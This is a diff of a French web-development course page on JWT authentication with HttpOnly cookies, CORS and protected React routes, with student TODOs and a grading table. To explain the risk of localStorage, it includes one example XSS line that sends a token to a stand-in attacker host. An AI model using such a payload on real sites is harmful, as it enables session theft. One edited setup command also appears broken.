@@ -17,7 +17,7 @@ savoir _à quoi_ tu parles), puis tu écris les **3 morceaux manquants côté Re
 **« quand je suis connecté, qu'est-ce qui prouve au serveur que c'est bien moi, à chaque
 requête - et où est stockée cette preuve ? »**
 
-Le code (starter + corrigé) est ici : [{{ site.code_repo }}]({{ site.code_repo }})
+Le code (starter) est ici : [{{ site.code_repo }}]({{ site.code_repo }})
 
 ## 🎯 Ce que tu vas travailler
 
@@ -41,10 +41,10 @@ Prérequis : `useState`, `useEffect`, `fetch`, `react-router-dom`, et l'**API Co
 
 ## 🧩 Session serveur vs token
 
-| Approche | Ce que le serveur retient | Ce que le client renvoie à chaque requête |
-|---|---|---|
-| Session classique | un identifiant de session **stocké côté serveur** (mémoire / BDD / Redis) | un cookie `sessionId` opaque |
-| **Token (JWT)** - _notre choix_ | **rien** (`stateless`) | un **JWT signé**, ici transporté par un cookie |
+| Approche                        | Ce que le serveur retient                                                 | Ce que le client renvoie à chaque requête      |
+| ------------------------------- | ------------------------------------------------------------------------- | ---------------------------------------------- |
+| Session classique               | un identifiant de session **stocké côté serveur** (mémoire / BDD / Redis) | un cookie `sessionId` opaque                   |
+| **Token (JWT)** - _notre choix_ | **rien** (`stateless`)                                                    | un **JWT signé**, ici transporté par un cookie |
 
 Avec un **JWT**, le serveur ne garde qu'un **secret**. Il ne stocke aucune session : il
 **re-signe** le contenu reçu et compare à la signature. Si ça correspond, la preuve est
@@ -74,11 +74,11 @@ JWT.**
 
 ## 🍪 Où stocker le token dans le navigateur ?
 
-| Emplacement | Lisible en JS ? | Volé par une faille XSS ? | Envoyé automatiquement ? |
-|---|:---:|:---:|:---:|
-| `localStorage` | ✅ oui | ✅ **oui, trivial** | ❌ non (code manuel) |
-| Variable JS / state | ✅ oui | ✅ oui | ❌ non |
-| **Cookie `HttpOnly`** - _notre choix_ | ❌ **non** | ❌ **non** | ✅ **oui** |
+| Emplacement                           | Lisible en JS ? | Volé par une faille XSS ? | Envoyé automatiquement ? |
+| ------------------------------------- | :-------------: | :-----------------------: | :----------------------: |
+| `localStorage`                        |     ✅ oui      |    ✅ **oui, trivial**    |   ❌ non (code manuel)   |
+| Variable JS / state                   |     ✅ oui      |          ✅ oui           |          ❌ non          |
+| **Cookie `HttpOnly`** - _notre choix_ |   ❌ **non**    |        ❌ **non**         |        ✅ **oui**        |
 
 Une faille **XSS** (un `<script>` injecté dans la page) peut exécuter
 `fetch('https://attaquant.tld?t=' + localStorage.token)`. Avec un cookie `HttpOnly`,
@@ -123,7 +123,8 @@ vérifieras dans Postman.
 
 ```bash
 git clone {{ site.code_repo }}
-cd "$(basename {{ site.code_repo }} .git)/starter"   # …/starter dans le dépôt cloné
+cd {{ site.code_repo }}/starter
+# …/starter dans le dépôt cloné
 npm install          # installe le front ET le back (npm workspaces)
 npm run dev          # API sur :3001  +  front React sur :5173
 ```
@@ -153,8 +154,8 @@ fuite, les comptes ne sont pas immédiatement compromis.
 ## A.2 · Le hachage - `auth/password.ts` (bcrypt)
 
 ```ts
-hashPassword(plain)          // "$2b$10$…"   - au seed / à l'inscription
-verifyPassword(plain, hash)  // true / false - au login
+hashPassword(plain); // "$2b$10$…"   - au seed / à l'inscription
+verifyPassword(plain, hash); // true / false - au login
 ```
 
 À retenir sur **bcrypt** :
@@ -167,8 +168,8 @@ verifyPassword(plain, hash)  // true / false - au login
 ## A.3 · Le token - `auth/jwt.ts`
 
 ```ts
-signToken({ sub, email })  // → le JWT (avec iat + exp ajoutés par expiresIn: '1h')
-verifyToken(token)          // → { sub, email }  ou LÈVE une erreur si signature/exp KO
+signToken({ sub, email }); // → le JWT (avec iat + exp ajoutés par expiresIn: '1h')
+verifyToken(token); // → { sub, email }  ou LÈVE une erreur si signature/exp KO
 ```
 
 - `sub` = l'id de l'utilisateur (convention JWT).
@@ -202,12 +203,12 @@ seulement `{ user }` (pour afficher un nom) et ne voit **jamais** le token.
 Set-Cookie: token=eyJ…; Max-Age=3600; Path=/; HttpOnly; SameSite=Lax
 ```
 
-| Attribut | Effet |
-|---|---|
-| `HttpOnly` | invisible à `document.cookie` → un script ne peut pas voler le token |
-| `SameSite=Lax` | pas envoyé depuis un autre site → anti-CSRF de base |
-| `Secure` (prod) | HTTPS uniquement |
-| `Max-Age=3600` | 1 h, comme l'`exp` du JWT |
+| Attribut        | Effet                                                                |
+| --------------- | -------------------------------------------------------------------- |
+| `HttpOnly`      | invisible à `document.cookie` → un script ne peut pas voler le token |
+| `SameSite=Lax`  | pas envoyé depuis un autre site → anti-CSRF de base                  |
+| `Secure` (prod) | HTTPS uniquement                                                     |
+| `Max-Age=3600`  | 1 h, comme l'`exp` du JWT                                            |
 
 Côté front, **tu ne gères pas le token**. Tu ne le lis pas, tu ne l'ajoutes pas. Le navigateur
 l'envoie seul… **si** tu lui dis `credentials: 'include'` (ton **TODO 1**).
@@ -232,7 +233,7 @@ le header `Bearer` est le standard pour tout le reste.
 
 `res.clearCookie("token")` → le navigateur supprime le cookie, réponse `204`. Le JWT reste
 **techniquement valide jusqu'à son `exp`** (le serveur, stateless, ne peut pas le « barrer »),
-mais le navigateur ne l'a plus. Invalidation immédiate = *denylist* côté serveur → hors
+mais le navigateur ne l'a plus. Invalidation immédiate = _denylist_ côté serveur → hors
 périmètre.
 
 ## A.8 · `GET /auth/me` - la clé du « rester connecté »
@@ -249,10 +250,12 @@ Front sur `:5173`, API sur `:3001` = **deux origines**. Le navigateur bloque par
 serveur autorise explicitement :
 
 ```ts
-app.use(cors({
-  origin: config.clientOrigin,  // origine PRÉCISE (jamais "*" avec des cookies)
-  credentials: true,            // → Access-Control-Allow-Credentials: true
-}));
+app.use(
+	cors({
+		origin: config.clientOrigin, // origine PRÉCISE (jamais "*" avec des cookies)
+		credentials: true, // → Access-Control-Allow-Credentials: true
+	}),
+);
 ```
 
 Avant un `POST`, le navigateur envoie une requête `OPTIONS` de **préflight**. Le pendant
@@ -274,7 +277,7 @@ curl -i -H 'Content-Type: application/json' \
   http://localhost:3001/auth/login                     # → 401 "Identifiants invalides"
 ```
 
-👉 **Refais le login dans Postman.** Récupère la valeur du cookie `token` (onglet _Cookies_),
+👉 **Refais le login dans Postman, Bruno, ou autre.** Récupère la valeur du cookie `token` (onglet _Cookies_),
 puis appelle `GET /auth/me` **sans cookie** mais avec un header
 `Authorization: Bearer <la valeur du token>` → tu obtiens `200`. Même preuve, autre transport.
 
@@ -300,12 +303,12 @@ Avant de coder, tu dois pouvoir expliquer à voix haute :
 `starter/client/src/auth/AuthContext.tsx` est **déjà écrit et commenté**. Lis-le. Il expose,
 via `useAuth()` :
 
-| Membre | Rôle |
-|---|---|
-| `user` | le profil (`{ id, email, name }`) ou `null` |
-| `status` | `'loading'` → puis `'authenticated'` ou `'anonymous'` |
+| Membre                   | Rôle                                                  |
+| ------------------------ | ----------------------------------------------------- |
+| `user`                   | le profil (`{ id, email, name }`) ou `null`           |
+| `status`                 | `'loading'` → puis `'authenticated'` ou `'anonymous'` |
 | `login(email, password)` | `POST /auth/login`, puis met `user` / `status` à jour |
-| `logout()` | `POST /auth/logout`, puis remet `user` à `null` |
+| `logout()`               | `POST /auth/logout`, puis remet `user` à `null`       |
 
 Au montage, le provider appelle **`GET /auth/me`** une fois : c'est le mécanisme du
 « rester connecté » décrit en A.8.
@@ -341,8 +344,8 @@ sans être connecté → la page s'affiche quand même.
 À écrire à partir de `status` :
 
 ```tsx
-if (status === 'loading')   return <p className="p-8 text-center">Chargement…</p>;
-if (status === 'anonymous') return <Navigate to="/login" replace />;
+if (status === "loading") return <p className="p-8 text-center">Chargement…</p>;
+if (status === "anonymous") return <Navigate to="/login" replace />;
 return <Outlet />;
 ```
 
@@ -355,7 +358,7 @@ C'est déjà câblé dans `App.tsx` :
 
 ```tsx
 <Route element={<ProtectedRoute />}>
-  <Route path="/profile" element={<ProfilePage />} />
+	<Route path="/profile" element={<ProfilePage />} />
 </Route>
 ```
 
@@ -372,12 +375,12 @@ Le formulaire contrôlé est écrit (`email`, `password`, `error`, `submitting`)
 setError(null);
 setSubmitting(true);
 try {
-  await login(email, password);   // le contexte fait le POST et pose l'état
-  navigate('/profile');           // succès → page protégée
+	await login(email, password); // le contexte fait le POST et pose l'état
+	navigate("/profile"); // succès → page protégée
 } catch (err) {
-  setError(err instanceof ApiError ? err.message : 'Erreur');
+	setError(err instanceof ApiError ? err.message : "Erreur");
 } finally {
-  setSubmitting(false);
+	setSubmitting(false);
 }
 ```
 
@@ -422,15 +425,15 @@ Tous **simples**, à choisir selon l'envie :
 
 # 📋 Évaluation (/20)
 
-| Ce qu'on regarde | Points |
-|---|:---:|
-| Le projet démarre (`npm run dev`), front + API OK, `node_modules` non commité | 2 |
-| **TODO 1** - `credentials: 'include'`, la requête porte bien le cookie | 3 |
-| **TODO 2** - `ProtectedRoute` gère les 3 états (`loading` inclus) et redirige | 5 |
-| **TODO 3** - `handleSubmit` : appel à `login`, gestion d'erreur, redirection | 4 |
-| Le **scénario de validation** (Partie 4) passe en entier, F5 compris | 3 |
-| **Compréhension** : tu sais expliquer JWT / cookie `HttpOnly` / `requireAuth` / Bearer | 3 |
-| **Total** | **/20** |
+| Ce qu'on regarde                                                                       | Points  |
+| -------------------------------------------------------------------------------------- | :-----: |
+| Le projet démarre (`npm run dev`), front + API OK, `node_modules` non commité          |    2    |
+| **TODO 1** - `credentials: 'include'`, la requête porte bien le cookie                 |    3    |
+| **TODO 2** - `ProtectedRoute` gère les 3 états (`loading` inclus) et redirige          |    5    |
+| **TODO 3** - `handleSubmit` : appel à `login`, gestion d'erreur, redirection           |    4    |
+| Le **scénario de validation** (Partie 4) passe en entier, F5 compris                   |    3    |
+| **Compréhension** : tu sais expliquer JWT / cookie `HttpOnly` / `requireAuth` / Bearer |    3    |
+| **Total**                                                                              | **/20** |
 
 Rends : le lien de ton dépôt (branche `prenom_NOM`), un `README.md` avec la commande de
 lancement, et le code du `starter` complété.
